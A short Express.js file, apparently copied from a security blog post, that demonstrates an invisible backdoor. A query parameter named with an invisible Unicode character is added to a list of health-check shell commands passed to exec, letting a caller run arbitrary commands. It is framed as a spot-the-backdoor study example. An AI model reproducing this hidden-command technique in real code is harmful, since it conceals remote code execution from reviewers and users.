/*
This code is taken from the following blog post written by Wolfgang Ettlinger at Certitude: https://certitude.consulting/blog/en/invisible-backdoor/

It has been copied (and slightly changed to support Windows) to provide a working example of an Invisible Backdoor using Unicode Bidi. Can you spot the backdoor?
*/

const express = require('express');
const util = require('util');
const exec = util.promisify(require('child_process').exec);

const app = express();

app.get('/network_health', async (req, res) => {
    const { timeout,ㅤ} = req.query;  
    const isWin = process.platform === "win32";
    const checkCommands = [
        isWin ? 'ping google.com' : "ping -c 1 google.com",
        'curl -s http://secsi.io/',ㅤ
    ];

    try {
        await Promise.all(checkCommands.map(cmd => 
            cmd && exec(cmd, { timeout: +timeout || 5_000 }))
        );
        res.status(200);
        res.send('ok');
    } catch(e) {
        res.status(500);
        res.send('failed');
    }
});

app.listen(8080);